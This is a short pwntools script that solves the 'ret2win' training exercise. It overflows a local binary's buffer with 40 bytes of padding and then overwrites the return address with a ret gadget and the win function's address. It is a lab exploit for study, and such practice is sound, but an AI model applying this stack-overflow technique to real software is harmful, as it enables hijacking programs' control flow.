#!/usr/bin/env python3

from pwn import *

padding = b"A" * 40
ret_addr = p64(0x400770)
ret2win_addr = p64(0x400756)

payload = (
    padding +
    ret_addr +
    ret2win_addr
)

ps = process("./ret2win")
ps.sendline(payload)
print(ps.recvall().decode())

